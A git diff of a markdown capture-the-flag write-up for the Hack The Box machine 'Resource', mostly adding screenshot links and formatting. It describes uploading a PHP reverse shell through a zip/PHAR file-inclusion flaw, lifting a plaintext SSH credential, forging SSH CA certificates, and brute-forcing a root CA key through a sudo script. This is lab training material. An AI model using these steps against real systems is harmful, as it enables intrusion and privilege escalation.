@@ -1,13 +1,17 @@
-#Resource.HTB
+![pwn3d](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/image.png)
 
-##Recon
+# Resource.HTB
+
+## Recon
 
 enumerating open ports with Rustscan 
 ```
 rustscan -a 10.129.173.4 --ulimit 9000 -- -sC -A
 ```
-Output 
-rustscan.png
+
+![Rustscan](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/rustscan.png) 
+![Rustscan2](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/rustscan2.png)
+
 
 adding it to hosts file 
 ```
@@ -15,11 +19,13 @@ sudo nano /etc/hosts
 ```
 whatweb scan redirects to http://itrc.ssg.htb/ adding it to hosts
 
-
+![whatweb](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/whatweb.png)
 it redirects to some IT support website with LOGIN and REGISTER and we know it is hosted with PHP 
 lets explore user registration
 
-##Exploitation
+![login](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/loggesin.png)
+
+## Exploitation
 
 it opens user registration and then redirects to dashboard where we can create tickets 
 
@@ -27,19 +33,17 @@ but we can only submit tickets with .zip extenstion
 
 or we can exploit the PHP file inclusion exploit by finding the stored file path and executing our shell code 
 
-
 Referencing PHAR (PHP Archives) exploit by Hacktricks
 Exploit ID - CVE-2023-41330
 
 https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/file-inclusion/phar-deserialization.md
 https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization
 
+lets upload pentestmonkey's rev shell 
 
-lets upload pentestmonkeys rev shell 
-
-shell.php
 
 ```php
+//shell.php
   <?php
   // php-reverse-shell - A Reverse Shell implementation in PHP
   // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -193,6 +197,8 @@ make a zip file of shell.php
 
 and upload as a ticket 
 
+![loggedin](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/ticket.png)
+
 Click on the ticket and copy the shell.zip file path 
 ```
 http://itrc.ssg.htb/uploads/b1b6433555455fe26b08ad6b9290c333268597ec.zip
@@ -271,8 +277,9 @@ and BAM!! we got the user ID and PASS in this
           }
         },
 ```
-msainristil:82yards2closeit
+![user pwn msainristil](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/ssh-user.png)
 
+```msainristil:82yards2closeit```
 
 Still no user flag 
 
@@ -288,6 +295,9 @@ so both of the files are used signing and authorizing keys
 we need to create a key and sign it wil ca-itrc
 
 ```
+ssh-keygen -t rsa -b 2048 -f sed
+```
+```bash
 msainristil@itrc:~/decommission_old_ca$ ssh-keygen -t rsa -b 2048 -f sed
 Generating public/private rsa key pair.
 Enter passphrase (empty for no passphrase): 
@@ -313,31 +323,21 @@ ca-itrc  ca-itrc.pub  sed  sed.pub
 ```
 we now have a dummy keypair now we have to sign it with ca-itrc with zzinter user
 
-```
+```bash
 msainristil@itrc:~/decommission_old_ca$ ssh-keygen -s ca-itrc -n zzinter -I xx sed.pub 
 Signed user key sed-cert.pub: id "xx" serial 0 for zzinter valid forever
 ```
 
 lets login with the following keypair
+```ssh -i sed  zzinter@resource.htb```
 
 YESSSS!!! LOGGED IN WITH ZZINTER 
+
 AND GOT THE USER FLAG
 
-```
-msainristil@itrc:~/decommission_old_ca$ ssh -i sed  zzinter@resource.htb
-Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64
+![user-flag](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/ssh-user2.png)
 
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-zzinter@itrc:~$ ls
-sign_key_api.sh  user.txt
-zzinter@itrc:~$ cat user.txt 
-```
-##Privilage Escalation
+## Privilage Escalation
 
 
 inside the user dir we have a file sign_key_api.sh 
@@ -399,9 +399,16 @@ the machine hostname is "ssg"
 
 running the file found in user's dir 'sign_key_api.sh '
 
-```chmod +x sign_key_api.sh```
+![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-19-09.png)
 
-```./sign_key_api.sh sed.pub support support > support.cert```
+```
+chmod +x sign_key_api.sh
+```
+
+```
+./sign_key_api.sh sed.pub support support > support.cert
+```
+![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-14-00.png)
 
 Note: to run the api in your home machine or PWNBox you need to add signserv.ssg.htb to your '/etc/hosts' file
 
@@ -409,7 +416,7 @@ signing in with support.cert and supoort user
 ```
 ssh support@resource.htb -p 2222 -i sed -o CertificateFile=support.cert 
 ```
-
+![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-34-14.png)
 we're in the support user in host machine i.e. 'ssg'
 
 there are two users in home dir
@@ -424,9 +431,15 @@ So after exploring /etc/ssh/auth_principals/zzinter
 
 i found its rolename i.e. zzinter_temp 
 
+![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-24-59.png)
+
 putting the username and role in the user dir file i.e. sign_key_api.sh
 
-after making changes to the sign key script run:
+after making changes to the sign key script 
+
+![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-32-55.png)
+
+run:
 
 ```
 ./sign_key_api.sh sed.pub zzinter zzinter_temp > zzinter.cert
@@ -436,12 +449,14 @@ got the access in zzinter@ssg machine using
 ```
 ssh zzinter@resource.htb -p 2222 -i sed -o CertificateFile=zzinter.cert 
 ```
+![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-34-14.png)
+
 checking permissions with sudo -l 
- found we can execute  /opt/sign_key.sh file as root
- 
+found we can execute  `/opt/sign_key.sh` file as root
+ ![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-35-52.png)
  exploring the file 
  
- `zzinter@ssg:~$ cat /opt/sign_key.sh `
+ ```zzinter@ssg:~$ cat /opt/sign_key.sh ```
  ```bash
 #!/bin/bash
 
@@ -503,14 +518,14 @@ if ! [[ $serial =~ ^[0-9]+$ ]]; then
 fi
 
 ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"
+```
 
-`
 
 so basically this file can real CA certificate file  and if the CA file matches the root CA file it will return error code 1
 
 let me explain :
 
-`
+```
 //lets take two strings a and b
 
 #!/bin/bash
@@ -594,13 +609,14 @@ if __name__ == '__main__':
     else:
         exit("\n\nFail\n") 
 ```
-
+![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2021-56-23.png)
 
 the exploit will take some time to bruteforce key file
 
 after the successfully executing the script save the ssh private key in your local machine as root.key
 
 then do 
+
 ```bash
 ssh-keygen -f root
 ```
@@ -615,6 +631,8 @@ Place the provided key content in the file:
 ```
 chmod 600 root.key
 ```
+
+https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2022-16-39.png
 Sign the public key to create a certificate:
 ```
 
@@ -627,5 +645,7 @@ Finally Connect to the target machine using the signed certificate:
 ```ssh root@itrc.ssg.htb -p2222 -i root -i root-cert.pub```
 
 ANDDD WE GOT THE ROOT FLAGGG!!!!!
+![](https://github.com/architmadankar/HackTheBox/blob/d00b457220eb66504d318b44db75c7a93e925ca6/resource.htb/ss/Screenshot%20from%202024-08-07%2022-17-09.png)
 
-
+## Conclusion
+Working through the 'Resource.HTB' machine was a challenging and rewarding experience that significantly enhanced my skills, pwning the 'Resource.HTB' machine took considerable time and effort, but the experience was invaluable. It taught me patience, persistence, and the necessity of a methodical approach to problem-solving in cybersecurity
